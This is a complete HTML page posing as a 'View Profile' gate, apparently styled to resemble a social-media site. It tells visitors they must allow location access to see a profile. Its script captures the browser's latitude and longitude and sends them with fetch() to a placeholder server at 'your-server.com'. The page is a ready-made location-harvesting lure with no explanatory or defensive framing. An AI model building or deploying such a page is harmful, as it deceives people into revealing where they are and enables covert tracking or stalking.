<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Location Access</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #fafafa;
            text-align: center;
        }
        .container {
            margin-top: 50px;
        }
        h1 {
            color: #262626;
        }
        button {
            background-color: #3897f0;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 5px;
            cursor: pointer;
        }
        button:hover {
            background-color: #007bbf;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>View Profile</h1>
        <p>To view this profile, please allow location access.</p>
        <button id="locationButton">Allow Location Access</button>
    </div>
    <script>
    document.getElementById('locationButton').addEventListener('click', function() {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                (position) => {
                    const latitude = position.coords.latitude;
                    const longitude = position.coords.longitude;

                    // Process the location data (e.g., send to server)
                    sendLocationData(latitude, longitude);
                },
                (error) => {
                    console.error("Error obtaining location: ", error);
                }
            );
        } else {
            console.error("Geolocation is not supported by this browser.");
        }
    });

    function sendLocationData(lat, lng) {
        // Example of sending data to a server
        fetch('https://your-server.com/api/location', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({ latitude: lat, longitude: lng }),
        })
        .then(response => response.json())
        .then(data => {
            console.log('Location data sent successfully:', data);
        })
        .catch((error) => {
            console.error('Error sending location data:', error);
        });
    }
</script>
</body>
</html>
